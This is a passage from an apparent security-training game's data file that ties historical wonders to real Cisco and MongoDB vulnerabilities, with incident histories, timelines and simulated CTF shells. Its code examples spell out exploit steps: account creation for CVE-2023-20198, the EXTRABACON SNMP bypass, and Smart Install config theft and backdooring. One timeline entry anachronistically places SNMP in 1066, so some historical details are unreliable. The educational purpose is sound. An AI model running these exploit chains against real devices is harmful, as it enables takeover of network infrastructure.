        { year: 392, event: "Theodosius closes temples — 35,000 unguarded treasuries looted", highlight: true },
        { year: 2015, event: "MongoDB 3.0: auth still off by default" },
        { year: 2017, event: "Jan: 35,000 exposed instances found; 27,000 wiped in 24h", highlight: true },
        { year: 2021, event: "OWASP A05: Security Misconfiguration — 90% of apps affected" },
      ],
      keyTakeaways: [
        "Default configurations are designed for convenience, not security — always harden",
        "Never expose database ports (27017, 5432, 3306) to the internet",
        "Rotate and audit credentials; never commit secrets to public repos",
        "Use tools like Shodan, Censys, or AWS Trusted Advisor to audit your own exposure",
      ],
      references: [
        { title: "OWASP A05:2021 — Security Misconfiguration", url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" },
        { title: "MongoDB Apocalypse — Victor Gevers Report", url: "https://www.bleepingcomputer.com/news/security/mongodb-apocalypse-is-here-as-ransom-attacks-hit-10-000-servers/" },
        { title: "SolarWinds — CISA Advisory", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a" },
        { title: "Shodan — IoT Search Engine", url: "https://www.shodan.io" },
      ],
    },
    ctf: {
      scenario: "You've found the Temple of Zeus treasury server. It runs MongoDB with default configuration — no authentication required. Investigate the filesystem, find the connection details, and access the unguarded treasury.",
      hint: "Look for hidden offering records. MongoDB's default port is 27017 and requires no credentials.",
      hints: [
        "Read the README first. Run: cat README.txt",
        "Explore the temple directory. Run: ls etc",
        "There may be hidden offering records. Run: ls -a etc  (files starting with . are hidden)",
        "Read the hidden configuration scroll. Run: cat etc/.env  — look for the database config.",
        "MongoDB has no auth enabled. Connect directly. Run: mongo connect localhost:27017",
        "Query the treasury. Run: mongo find citizens",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/README.txt", value: "FLAG{M0NG0DB_", label: "Mission Brief — Temple Treasury Target" },
        { trigger: "/etc/.env", value: "N0_4UTH_", label: "Hidden Config — No Authentication Configured" },
        { trigger: "mongo find citizens", value: "3XP0S3D}", label: "Database Query — Treasury Contents Exposed" },
      ],
      files: {
        "/README.txt": [
          "TARGET: Temple of Zeus Treasury Database",
          "Suspected: MongoDB with default configuration",
          "",
          "Commands:",
          "  ls, cat, cd             — explore the filesystem",
          "  mongo connect <host> [user] [pass]",
          "  mongo find <collection>",
        ].join("\n"),
        "/etc/temple.conf": [
          "[temple]",
          "name=OlympiaTemple",
          "deity=Zeus",
          "debug=true",
          "",
          "[treasury]",
          "# TODO: add authentication before the Olympics!",
          "host=mongodb://localhost:27017",
          "db=olympia",
        ].join("\n"),
        "/etc/.env": [
          "# Temple environment configuration",
          "APP_ENV=production",
          "SACRED_KEY=zeus123",
          "MONGO_HOST=localhost",
          "MONGO_PORT=27017",
          "MONGO_AUTH=false",
          "# No keeper credentials configured — auth disabled",
        ].join("\n"),
      },
      dirs: {
        "/": [
          { name: "README.txt", isDir: false },
          { name: "etc", isDir: true },
        ],
        "/etc": [
          { name: "temple.conf", isDir: false },
          { name: ".env", isDir: false, hidden: true },
        ],
      },
      extraCommands: {
        mongo: (args) => {
          const [sub, ...rest] = args;
          if (sub === "connect") {
            const [, user, pass] = rest;
            const noAuth = !user && !pass;
            const defaultCreds =
              (user === "admin" && (!pass || pass === "admin" || pass === "password")) ||
              (!user && !pass);
            if (noAuth || defaultCreds) {
              return {
                lines: [
                  "MongoDB shell version v4.4.0",
                  `Connecting to: ${rest[0] || "localhost:27017"}`,
                  "WARNING: Access control is not enabled.",
                  "         Authentication is disabled.",
                  "Connected successfully (no credentials required).",
                  "> use olympia",
                  "switched to db olympia",
                  'Type "mongo find <collection>" to query.',
                ],
              };
            }
            return { lines: ["Connection failed: Authentication error"] };
          }
          if (sub === "find") {
            return {
              lines: [
                '{ "_id": 1, "name": "Zeus High Keeper", "role": "supreme_keeper" }',
                '{ "_id": 2, "name": "Pheidias", "role": "sculptor" }',
                '{ "_id": 3, "name": "Leonidas", "role": "guardian" }',
              ],
            };
          }
          return { lines: ["Usage: mongo connect <host> [user] [pass]", "       mongo find <collection>"] };
        },
      },
    },
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // MEDIEVAL EPOCH — Cisco CVEs × Wonders of the Medieval World
  // ═══════════════════════════════════════════════════════════════════════════

  // ─── Medieval Stage 1: Hagia Sophia — CVE-2023-20198 IOS XE CVSS 10.0 ────
  {
    epochId: "cisco-core",
    wonder: { name: "Hagia Sophia", location: "Constantinople (Istanbul), Turkey", era: "1453 CE", emoji: "🕌" },
    id: "stage-m01",
    order: 1,
    title: "The Gate Falls Without a Key",
    subtitle: "CVE-2023-20198 — Cisco IOS XE Web UI, CVSS 10.0",
    category: "owasp",
    cveId: "CVE-2023-20198",
    cvssScore: 10.0,
    xp: 150,
    badge: { id: "badge-m-iosxe", name: "Gate Breaker", emoji: "🕌" },
    challengeType: "ctf",
    info: {
      tagline: "No password needed. One HTTP request to own every Cisco IOS XE device on the internet.",
      year: 2023,
      overview: [
        "May 29, 1453. Mehmed II's Ottoman army of 80,000 had been battering Constantinople's triple walls for 53 days. The city had held — those walls had never fallen in a thousand years. Then a small squad of soldiers found the Kerkoporta: a side gate in the inner wall, left unlocked by accident during a night sortie. They slipped through without firing a shot. Within hours, the Byzantine Empire — the eastern continuation of Rome — was over. The greatest city in the medieval world fell not to overwhelming force, but to a gate no one remembered to lock.",
        "CVE-2023-20198 is that Kerkoporta. Cisco IOS XE's web management interface — the browser-based admin panel that lets network engineers log in to configure routers and switches — had an authentication bypass on its account creation endpoint. An attacker anywhere on the internet could send a single HTTP POST and create a new user account with Privilege Level 15: full administrative control. No credentials. No prior access. No alert. One request, and the gate was open.",
        "Attackers had been quietly exploiting this for at least three weeks before Cisco knew it existed. By the time Cisco disclosed CVE-2023-20198 on October 16, 2023, over 40,000 enterprise routers, switches, and wireless controllers worldwide were already compromised. Healthcare providers, universities, financial institutions, government agencies — the network gates of virtually every sector were standing open. The CVSS score was the maximum possible: 10.0.",
      ],
      technical: {
        title: "The Authentication Bypass: How One HTTP Request Creates Admin Access",
        body: [
          "The IOS XE web UI is enabled by the commands `ip http server` (HTTP) or `ip http secure-server` (HTTPS). When enabled, it exposes a REST-like management interface typically on port 80 or 443. The vulnerable endpoint was `/webui/logoutconfirm.html`, which processed user account creation requests. The flaw: this endpoint performed no authentication check before creating accounts — it trusted that any request reaching it was already authorized. It processed the POST body, wrote the new credentials to the device's local user database, and returned success. Silently, with no log entry by default.",
          "The full kill chain combined two CVEs. CVE-2023-20198 created the backdoor account at Privilege Level 15 (equivalent to root on IOS XE). CVE-2023-20273 — a separate command injection flaw in the same web UI — then allowed that new account to write arbitrary files to the device's filesystem. Attackers used this chain to install 'BadCandy': a Lua-based HTTP implant embedded directly in the IOS XE web server. BadCandy listened at a URL-encoded path that IOS XE's own web server wouldn't log, answered a secret command, and survived reboots, credential resets, and even IOS XE software upgrades. Finding and removing it required a full OS reinstall.",
        ],
        codeExample: {
          label: "CVE-2023-20198 + CVE-2023-20273 exploit chain",
          code: `# ── STAGE 1: CVE-2023-20198 — Unauthenticated account creation ──────────────
curl -X POST http://TARGET/webui/logoutconfirm.html \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "username=backdoor&password=Cisco123!&privilege=15"
# IOS XE creates the account at Level 15 — no auth, no log entry

# ── STAGE 2: Verify Level 15 (root-equivalent) access ────────────────────────
curl -u backdoor:Cisco123! http://TARGET/webui/
# Full admin console — 'show running-config', write configs, reload device

# ── STAGE 3: CVE-2023-20273 — Write BadCandy implant to disk ─────────────────
# Command injection via 'ip http secure-server' config endpoint
# Implant written to: /usr/binos/conf/nginx-conf/cisco_service.conf

# ── STAGE 4: Implant communicates via URL-encoded path bypass ────────────────
curl "http://TARGET/%2508/webui/"
# {"status":"ok"}   ← BadCandy active; persists across reboots and upgrades

# ── DETECTION ────────────────────────────────────────────────────────────────
show running-config | include username
# Any user you didn't create = compromised

# ── REMEDIATION ──────────────────────────────────────────────────────────────
no ip http server
no ip http secure-server
# Then: upgrade to IOS XE 17.9.4a or later
# If already implanted: full OS reinstall required`,
        },
      },
      incident: {
        title: "40,000 Unlocked Gates: The October 2023 IOS XE Campaign",
        when: "September 28 – October 22, 2023",
        where: "Global — enterprise networks across healthcare, education, government, financial services, and telecom",
        impact: "40,000+ Cisco IOS XE devices fully compromised; BadCandy backdoor installed; suspected state-sponsored operation; three weeks of undetected access before disclosure",
        body: [
          "The attackers were silent and methodical. They began exploiting CVE-2023-20198 no later than September 28, 2023 — more than two weeks before Cisco knew the vulnerability existed. For three weeks, they moved through the internet's enterprise network infrastructure like water through an open gate, compromising routers and switches at hospitals, universities, banks, ISPs, and government agencies. Each compromised device received the BadCandy implant. Security operations teams saw nothing. There were no credentials to steal because no credentials were needed. There were no failed login alerts because there were no logins — just a silent POST request that the device accepted and executed.",
          "Cisco disclosed CVE-2023-20198 on October 16, 2023 — a Monday morning — with no patch ready. Within two hours, VulnCheck (a vulnerability intelligence firm) had built a scanner and began sweeping the internet. By end of day: 41,000 devices confirmed compromised. Then something unusual happened: the count dropped significantly the next morning. Not because organizations had patched — they hadn't. The attackers had updated their BadCandy implants overnight to hide from VulnCheck's exact detection signature. They were watching Cisco's disclosure, reading the security research, and adapting their implant in real time to stay hidden. This level of operational sophistication pointed to a state-sponsored threat actor; Cisco Talos attributed the campaign to a suspected Chinese APT group.",
          "Remediation was punishing. Disabling the IOS XE web UI (`no ip http server`, `no ip http secure-server`) closed the exploit path for uninfected devices. But devices already implanted with BadCandy could not be cleaned with a credential reset or software upgrade — the Lua backdoor was baked into the device's nginx configuration and survived both. Affected organizations had to factory-reset critical network infrastructure mid-operation, physically access devices in data centers and wiring closets, and rebuild configurations from scratch. Some healthcare networks had to isolate clinical VLANs during the process. Cisco released the patch — IOS XE 17.9.4a — on October 22. By then, the attack had been running for 24 days undetected, and cleanup took weeks more. The Kerkoporta had been standing open the entire time.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (unauthenticated)", sub: "single HTTP POST to /webui/", type: "attacker" },
          { label: "IOS XE Web UI endpoint", sub: "no auth check — account created", type: "system" },
          { label: "Level 15 backdoor user", sub: "CVE-2023-20273 chains to file write", type: "victim" },
          { label: "BadCandy implant", sub: "persistent, survives upgrades", type: "result" },
        ],
      },
      timeline: [
        { year: 1453, event: "Constantinople falls — Kerkoporta gate left unlocked; Ottoman soldiers enter uncontested; Byzantine Empire ends", highlight: true },
        { year: 2023, event: "Sep 28: Attackers begin silently exploiting CVE-2023-20198 — three weeks before Cisco knows" },
        { year: 2023, event: "Oct 16: Cisco discloses CVE-2023-20198 — CVSS 10.0, no patch available at disclosure" },
        { year: 2023, event: "Oct 16–17: VulnCheck scans internet; 41,000+ compromised devices found within hours" },
        { year: 2023, event: "Oct 17: Attacker updates BadCandy implant overnight to evade detection scanners" },
        { year: 2023, event: "Oct 22: Cisco releases IOS XE 17.9.4a — 24 days after exploitation began" },
      ],
      keyTakeaways: [
        "Disable the IOS XE web UI on every device unless actively needed (`no ip http server`)",
        "Never expose network device management interfaces to the internet — use out-of-band management networks",
        "Run `show running-config | include username` regularly — unexpected users mean you are compromised",
        "CVSS 10.0 means emergency patch, not scheduled maintenance — every hour of delay is a compromised device",
        "Persistent implants survive credential resets; assume full OS reinstall is required after compromise",
      ],
      references: [
        { title: "Cisco Security Advisory — CVE-2023-20198", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z" },
        { title: "VulnCheck: 40K Devices Compromised", url: "https://vulncheck.com/blog/cisco-ios-xe-exploitation" },
        { title: "Cisco Talos: BadCandy Implant Analysis", url: "https://blog.talosintelligence.com/threat-actor-abuses-cisco-talos-iosxe/" },
        { title: "CVE-2023-20198 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2023-20198" },
      ],
    },
    ctf: {
      scenario: "In October 2023, a suspected Chinese state-sponsored group silently compromised over 40,000 Cisco IOS XE devices before Cisco disclosed the flaw. The technique: the admin panel registered new users without any authentication check. One request, administrator access, no credentials needed. Replicate the initial access method used in the largest IOS XE campaign ever recorded.",
      hint: "The admin panel's registration endpoint requires no credentials. Create an account, then use it to access the restricted configuration.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Probe the target to confirm the vulnerability. Run: probe-target",
        "The registration endpoint needs no credentials. Run: forge-credentials agent p4ssw0rd",
        "Log in with your new account. Run: login agent p4ssw0rd",
        "Pull the classified network records. Run: extract-intel",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CV3_2023_", label: "Mission Brief — IOS XE Zero-Day Campaign" },
        { trigger: "forge-credentials agent p4ssw0rd", value: "20198_N0_", label: "Account Created — No Auth Required" },
        { trigger: "extract-intel", value: "AUTH_RCE}", label: "Intel Extracted — Full Device Access Confirmed" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: HAGIA SOPHIA",
          "Target: Cisco IOS XE Web UI — CVE-2023-20198",
          "Firmware: v17.9.3  CVSS: 10.0",
          "",
          "No credentials required. One request creates an admin account.",
          "Exploitation sequence: probe-target → forge-credentials → login → extract-intel",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "probe-target": () => ({
          lines: [
            "Probing target: hagia-sophia-hub [Istanbul]",
            "Device: network gateway  firmware: v17.9.3",
            "Admin panel: reachable — no authentication on registration endpoint",
            "Status: vulnerable — unauthenticated account creation confirmed",
          ],
        }),
        "forge-credentials": (args) => {
          const [user, pass] = args;
          if (!user || !pass) return { lines: ["Usage: forge-credentials <username> <password>"] };
          return {
            lines: [
              `Registering account: ${user} / ${pass}`,
              "No authentication check on registration endpoint.",
              `Account created. Privilege: administrator`,
              `Run: login ${user} ${pass}`,
            ],
          };
        },
        "login": (args) => {
          const [user, pass] = args;
          if (!user || !pass) return { lines: ["Usage: login <username> <password>"] };
          return {
            lines: [
              `Authenticating as ${user}...`,
              "Access granted. Administrator session active.",
              "Run: extract-intel",
            ],
          };
        },
        "extract-intel": () => ({
          lines: [
            "Pulling classified network records...",
            "",
            "hostname: hagia-sophia-gw",
            "admin accounts: [redacted], agent",
            "network segments: 4 classified subnets",
            "Run 'assemble' to retrieve your fragment.",
          ],
        }),
      },
    },
  },

  // ─── Medieval Stage 2: Tower of London — CVE-2016-6366 EXTRABACON ─────────
  {
    epochId: "cisco-core",
    wonder: { name: "Tower of London", location: "London, England", era: "1066 CE", emoji: "🗼" },
    id: "stage-m02",
    order: 2,
    title: "EXTRABACON — The NSA's SNMP Weapon",
    subtitle: "CVE-2016-6366 — Cisco ASA Buffer Overflow via SNMP",
    category: "owasp",
    cveId: "CVE-2016-6366",
    cvssScore: 8.1,
    xp: 200,
    badge: { id: "badge-m-extrabacon", name: "Shadow Broker", emoji: "🗼" },
    challengeType: "ctf",
    info: {
      tagline: "The NSA built a weapon to overflow Cisco's memory. The Shadow Brokers gave it to the world.",
      year: 2016,
      overview: [
        "In 1671, a soldier named Colonel Thomas Blood disguised himself as a clergyman, spent weeks befriending the Keeper of the Tower's Jewel House, and one morning struck the Keeper unconscious with a mallet and walked out with the Crown Jewels under his cloak. The Tower's security was designed around a single assumption: anyone who passed the outer gate was authorized. The outer gate used a shared challenge-response — a community string, available to any credentialed party. Blood had the response. He got through. The inner system never questioned what happened next.",
        "CVE-2016-6366, codename EXTRABACON, is built on the same assumption. Cisco ASA firewalls run SNMP (Simple Network Management Protocol) on UDP port 161, accepting monitoring queries from any host that knows the community string — and the default community string is 'public.' EXTRABACON sends a crafted SNMP OID request targeting the CISCO-ENHANCED-MEMPOOL-MIB handler, overflowing a fixed-size heap buffer by injecting more data than it was allocated to hold. The overflow overwrites the adjacent enable-password authentication function pointer in memory, replacing it with code that always returns 'authenticated.' The firewall's perimeter defenses remain intact. The gate simply stops checking credentials.",
        "EXTRABACON was built by the NSA Equation Group as a classified offensive capability and used in intelligence operations for years before anyone outside the NSA knew it existed. On August 13, 2016, a group calling themselves the Shadow Brokers published it alongside EternalBlue and the rest of the NSA's BANANAGLEE toolkit — in one afternoon, a classified nation-state weapon became available to every threat actor on earth. Cisco's Emergency Advisory — the first time Cisco had ever used the word 'Emergency' in an advisory — went out the same day. Every ASA with community string 'public' or 'private' was now a target for every government, criminal gang, and script kiddie simultaneously.",
      ],
      technical: {
        title: "SNMP Heap Overflow — How EXTRABACON Silently Bypasses ASA Authentication",
        body: [
          "SNMP v2c — the most common enterprise deployment — sends the community string in plaintext with every packet. Any network tap, Wireshark capture, or man-in-the-middle can recover it in seconds. EXTRABACON targeted a heap buffer in the ASA's SNMP handler that processed CISCO-ENHANCED-MEMPOOL-MIB OID requests. The handler used `memcpy()` to copy attacker-supplied OID data into a 64-byte heap buffer, using the length value from the attacker's packet as the copy length — with no bounds check. By supplying 255 bytes, the attacker overflowed 191 bytes past the buffer boundary, overwriting the heap metadata and the adjacent function pointer for the enable-password authentication check.",
          "The Shadow Brokers release included version-specific shellcode payloads for over 20 distinct ASA firmware versions: 8.x, 9.0, 9.1, 9.2, 9.3, and 9.4 variants. An attacker first used a clean SNMP walk to identify the exact firmware version, then selected the matching payload. The exploit's effect was surgical: it did not crash the ASA or produce log output. It patched the in-memory enable-authentication function to unconditionally return 'authenticated,' then returned the ASA to normal operation. The device appeared to run normally while the attacker had silent SSH access to the CLI — no logs, no alerts, no evidence beyond the access itself.",
        ],
        codeExample: {
          label: "EXTRABACON exploit chain — SNMP overflow to ASA enable bypass",
          code: `# ── STEP 1: Verify SNMP access with default community string ─────────────────
snmpwalk -v2c -c public TARGET_ASA_IP .1.3.6.1.2.1.1.1.0
# Returns: sysDescr = "Cisco Adaptive Security Appliance Version 9.2(4)"
# Any response = community string accepted

# ── STEP 2: Confirm exact firmware version (shellcode is version-specific) ────
snmpget -v2c -c public TARGET_ASA_IP .1.3.6.1.2.1.1.1.0

# ── STEP 3: Launch EXTRABACON with leaked NSA shellcode payload ───────────────
python extrabacon.py exploit -t TARGET_ASA_IP -c public --version 9.2.4
# Sends crafted OID → 64-byte heap buffer overflow in SNMP handler
# Overwrites enable-auth function pointer → always returns 'authenticated'

# ── STEP 4: SSH to ASA — enable password no longer required ──────────────────
ssh admin@TARGET_ASA_IP
# enable
# (press Enter — no password)
# ciscoasa# ← full administrative CLI access

# ── DETECTION ─────────────────────────────────────────────────────────────────
show snmp-server community
# Any 'public' or 'private' entry = immediate risk; change before patching

# ── REMEDIATION ───────────────────────────────────────────────────────────────
no snmp-server community public
no snmp-server community private
# Restrict SNMP to management host only:
# snmp-server host MGMT_IP community STRONG_RANDOM_STRING
# Patch to: ASA 9.1(7.9) / 9.6(1.12) / 9.8(1.3) or later`,
        },
      },
      incident: {
        title: "EXTRABACON in the Wild — Shadow Brokers to Iranian APT (2016–2017)",
        when: "August 13, 2016 (disclosure and immediate exploitation)",
        where: "Cisco ASA 5500/5500-X firewalls globally — government agencies, financial institutions, critical infrastructure",
        impact: "NSA cyberweapon released publicly; Cisco Emergency Advisory same day; weaponized by Iranian APT groups within weeks",
        body: [
          "The Equation Group developed EXTRABACON as part of BANANAGLEE — a toolkit for persistent access to network perimeter devices. Intelligence assessments and leaked NSA documents published by The Intercept suggest the toolkit was used to compromise ASA firewalls protecting government agencies, financial institutions, and critical infrastructure across the Middle East, Europe, and Asia. A compromised ASA is a perfect intelligence collection platform: all traffic flows through it, and it can be silently configured to log or mirror any connection of interest. The NSA exploited this for years — device owners had no way to know their firewalls had been modified.",
          "On August 13, 2016, the Shadow Brokers published EXTRABACON alongside EternalBlue, DoublePulsar, and the full Equation Group toolkit. Cisco's Emergency Advisory arrived the same afternoon — unprecedented in both speed and language. Security researchers had working exploits running within 24 hours. Within 48 hours, automated scanners were hitting every internet-exposed ASA with community string 'public' or 'private.' Shodan searches returned tens of thousands of ASAs with SNMP exposed. The community string 'public' was so common that Cisco's own hardening guides had recommended changing it for years — but most organizations had not.",
          "The Shadow Brokers continued dumping NSA tools through 2016 and 2017. EternalBlue — released in April 2017 — powered WannaCry (May 2017, $4B estimated damage) and NotPetya (June 2017, $10B estimated damage). EXTRABACON itself was independently weaponized by Iranian APT groups APT33 and APT34 in campaigns targeting Middle Eastern financial and energy organizations through late 2016 and 2017 — documented by Symantec and Mandiant. The lesson is permanent: classified cyberweapons are not eternally secret. Any device left on default configuration — 'public' community string, 'admin/admin' credentials — is not just currently at risk; it is a countdown timer waiting for the next leak.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (NSA → anyone)", sub: "SNMP community string", type: "attacker" },
          { label: "Cisco ASA SNMP", sub: "heap buffer overflow", type: "system" },
          { label: "ASA Firmware Memory", sub: "code execution", type: "victim" },
          { label: "Auth Bypass / RCE", sub: "firewall fully owned", type: "result" },
        ],
      },
      timeline: [
        { year: 1066, event: "Tower of London built — SNMP message protocol established for tower communications" },
        { year: 2001, event: "Cisco ASA introduced — SNMP subsystem inherited vulnerable code" },
        { year: 2016, event: "Aug 13: Shadow Brokers leak EXTRABACON and NSA toolkit", highlight: true },
        { year: 2016, event: "Aug 13: Cisco emergency advisory published for CVE-2016-6366" },
        { year: 2017, event: "SNMP attack techniques reused in subsequent nation-state campaigns" },
      ],
      keyTakeaways: [
        "SNMP community strings are weak authentication — change 'public'/'private' immediately",
        "Restrict SNMP access to specific management hosts, never expose it to the internet",
        "Government-developed cyberweapons will eventually be leaked — patch proactively",
        "Any management protocol can be an attack surface if not restricted",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2016-6366", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp" },
        { title: "CVE-2016-6366 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2016-6366" },
        { title: "Shadow Brokers Leak Analysis — Cisco Talos", url: "https://blog.talosintelligence.com/shadow-brokers/" },
      ],
    },
    ctf: {
      scenario: "EXTRABACON was the NSA's weapon for owning Cisco ASA firewalls — engineered by the Equation Group and leaked to the world by the Shadow Brokers in August 2016. The attack targets SNMP, a protocol most organizations leave wide open for network monitoring, often still running on the default community string. Overflow the handler's buffer with an oversized packet — the same technique that instantly handed every nation-state adversary the NSA's own playbook.",
      hint: "The monitoring protocol uses a default access code of 'public'. Once you confirm access, send an oversized packet to trigger the overflow and get in.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Test the monitoring protocol with the default access code. Run: probe-snmp public",
        "Confirm the firmware version before overflowing. Run: probe-snmp public version",
        "Send the oversized packet to trigger the buffer overflow. Run: overflow-handler public",
        "Access the system after the overflow disables authentication. Run: access-system",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{3XTRB4C0N_", label: "Mission Brief — EXTRABACON NSA Weapon" },
        { trigger: "overflow-handler public", value: "SNMP_", label: "Buffer Overflow — SNMP Handler Corrupted" },
        { trigger: "access-system", value: "0WN3D}", label: "System Access — Authentication Bypassed" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: TOWER OF LONDON",
          "Target: Cisco ASA SNMP subsystem — CVE-2016-6366 (EXTRABACON)",
          "Firmware: v9.2(4)  CVSS: 8.1",
          "",
          "SNMP community string: public (default — never changed)",
          "Exploitation sequence: probe-snmp → overflow-handler → access-system",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "probe-snmp": (args) => {
          const code = args[0] || "";
          const query = args[1] || "status";
          if (code === "public" || code === "private") {
            return {
              lines: [
                `Probing monitoring protocol — access code: '${code}'  query: ${query}`,
                "Response received:",
                "  Device: Tower of London comms node",
                "  Firmware: v9.2(4)",
                "",
                "Access code accepted.",
              ],
            };
          }
          return { lines: [`Probe failed — access code '${code}' rejected. Try a default.`] };
        },
        "overflow-handler": (args) => {
          const code = args[0] || "";
          if (code === "public" || code === "private") {
            return {
              lines: [
                `Sending oversized packet — access code: ${code}`,
                "",
                "Packet crafted: 500 bytes (handler buffer: 64 bytes)",
                "Overflow triggered in protocol handler",
                "Adjacent memory overwritten — authentication check disabled",
                "",
                "Handler compromised. Run: access-system",
              ],
            };
          }
          return { lines: ["Usage: overflow-handler <access-code>"] };
        },
        "access-system": () => ({
          lines: [
            "Connecting to node — authentication check: bypassed",
            "",
            "Tower of London — Comms Node  [classified access]",
            "Run 'assemble' to retrieve your fragment.",
          ],
        }),
      },
    },
  },

  // ─── Medieval Stage 3: Angkor Wat — CVE-2018-0171 Smart Install RCE ───────
  {
    epochId: "cisco-core",
    wonder: { name: "Angkor Wat", location: "Siem Reap, Cambodia", era: "1113 CE" , emoji: "🛕" },
    id: "stage-m03",
    order: 3,
    title: "The Forgotten Supply Gate",
    subtitle: "CVE-2018-0171 — Cisco Smart Install, CVSS 9.8",
    category: "owasp",
    cveId: "CVE-2018-0171",
    cvssScore: 9.8,
    xp: 200,
    badge: { id: "badge-m-smartinstall", name: "Gate Crasher", emoji: "🛕" },
    challengeType: "ctf",
    info: {
      tagline: "A port no one remembered was open. No password. Unauthenticated code execution on every switch in the empire.",
      year: 2018,
      overview: [
        "Angkor Wat was built with an elaborate network of supply channels — raised causeways, storage depots, access roads — because constructing the largest religious monument on earth required continuous provisioning from distant provinces. One service entrance on the north side was designated for supply deliveries: a gate that accepted materials without full credential verification, because the volume of traffic was too high for individual identity checks. When Angkor fell out of active use in the 15th century, that gate was simply forgotten. The records of it were lost. For centuries it stood open — unguarded, unknown, waiting.",
        "CVE-2018-0171 is that forgotten gate. Cisco's Smart Install feature — designed to enable zero-touch provisioning of newly connected switches, allowing a director switch to automatically push IOS images and startup configurations — listens on TCP port 4786 with no authentication whatsoever. The design assumption was a sealed internal provisioning network. The reality was that this port ended up internet-exposed on hundreds of thousands of switches worldwide. An attacker who could reach TCP/4786 could send a single Smart Install message to download the device's complete running configuration (with all credentials in cleartext or weak encryption), overwrite the startup configuration with a backdoored version, or in some builds trigger a buffer overflow for arbitrary code execution.",
        "Cisco disclosed CVE-2018-0171 on March 28, 2018. Cisco Talos immediately scanned the internet and found 168,000 vulnerable devices exposed. Within days, the US-CERT and DHS jointly issued Emergency Alert AA18-106A — one of the most direct public attributions of state-sponsored network infrastructure attacks ever published by the US government — naming Russian GRU's APT28 (Fancy Bear) as the actor exploiting Smart Install as part of the VPNFilter campaign: a botnet of 500,000+ compromised routers and switches carrying a destructive stage-2 payload. The FBI seized VPNFilter's C2 domain. The supply gate had been open for years, and the enemy had already walked through.",
      ],
      technical: {
        title: "Smart Install: Unauthenticated Provisioning — Config Theft to Code Execution",
        body: [
          "Smart Install consists of a director switch (or Smart Install Director server) that pushes IOS images and configurations to newly connected client switches. The client broadcasts a Smart Install message on boot: 'I just connected, give me my configuration.' The director responds with TFTP file transfers. No authentication at any step — the entire protocol runs on trust. TCP/4786 is the control channel. SIET (Smart Install Exploitation Tool, publicly available) automates three attacks: (1) `siet.py -g` downloads the running-config and startup-config via TFTP without credentials; (2) `siet.py -c` uploads a replacement startup-config (loaded on next reload); (3) `siet.py -e` triggers the CVE-2018-0171 buffer overflow for arbitrary code execution in the IOS process.",
          "The running configuration extracted via Smart Install is the complete network blueprint: enable and enable-secret passwords (MD5-hashed, often crackable), local user accounts, SNMP community strings (often 'public'), VPN pre-shared keys in cleartext, RADIUS shared secrets, and the complete network topology. The configuration replacement attack is worse than a read — an attacker can add an unauthorized admin account, remove logging to cover subsequent activity, or modify ACLs to permit traffic that should be blocked. The config replacement is silent and survives reboots.",
        ],
        codeExample: {
          label: "CVE-2018-0171 — Smart Install config theft and replacement",
          code: `# ── STEP 1: Scan for open Smart Install port ──────────────────────────────────
nmap -p 4786 --open TARGET_SUBNET/24
# 4786/tcp open  smartinstall  ← no authentication required

# ── STEP 2: Verify Smart Install is active ────────────────────────────────────
python siet.py -i TARGET_IP -g
# Downloads running-config via TFTP — no credentials sent
# File contains: enable passwords, SNMP strings, VPN PSKs, local users

# ── STEP 3: Inspect extracted credentials ────────────────────────────────────
# enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0  ← MD5 crackable
# snmp-server community public RO   ← default SNMP string
# crypto isakmp key VPNsecret123 address 0.0.0.0   ← VPN PSK in cleartext

# ── STEP 4: Replace startup config with backdoored version ───────────────────
python siet.py -i TARGET_IP -c backdoored.cfg
# Device loads attacker config on next reload — silent, survives reboots

# ── DETECTION ─────────────────────────────────────────────────────────────────
show vstack
# Any output = Smart Install enabled and listening on TCP/4786

# ── REMEDIATION ───────────────────────────────────────────────────────────────
no vstack
# Block TCP/4786 at perimeter ACL if no vstack is unavailable
# Upgrade to IOS 15.2(7)E3 / 15.6(3)M4 or later`,
        },
      },
      incident: {
        title: "VPNFilter Botnet — Russian GRU Targets 54 Countries (2017–2018)",
        when: "Late 2017 – May 2018 (active exploitation before and after disclosure)",
        where: "500,000+ routers and switches across 54 countries — ISPs, critical infrastructure, government, home offices",
        impact: "US-CERT Emergency Alert AA18-106A; FBI C2 domain seizure; GRU/APT28 attribution; destructive kill-switch capability deployed",
        body: [
          "Russian GRU's APT28 (Fancy Bear) unit began the VPNFilter campaign in late 2017, using Smart Install exploitation alongside default credentials and weak SNMP community strings as initial access vectors. The campaign targeted ISPs, telecommunications providers, and critical infrastructure operators in 54 countries — with particular concentration in Ukraine, where VPNFilter-infected devices were pre-positioned near high-value targets including election infrastructure. The goal was dual-purpose: intelligence collection via passive traffic monitoring, and pre-positioned destructive capability. By early 2018, the botnet had over 500,000 infected devices.",
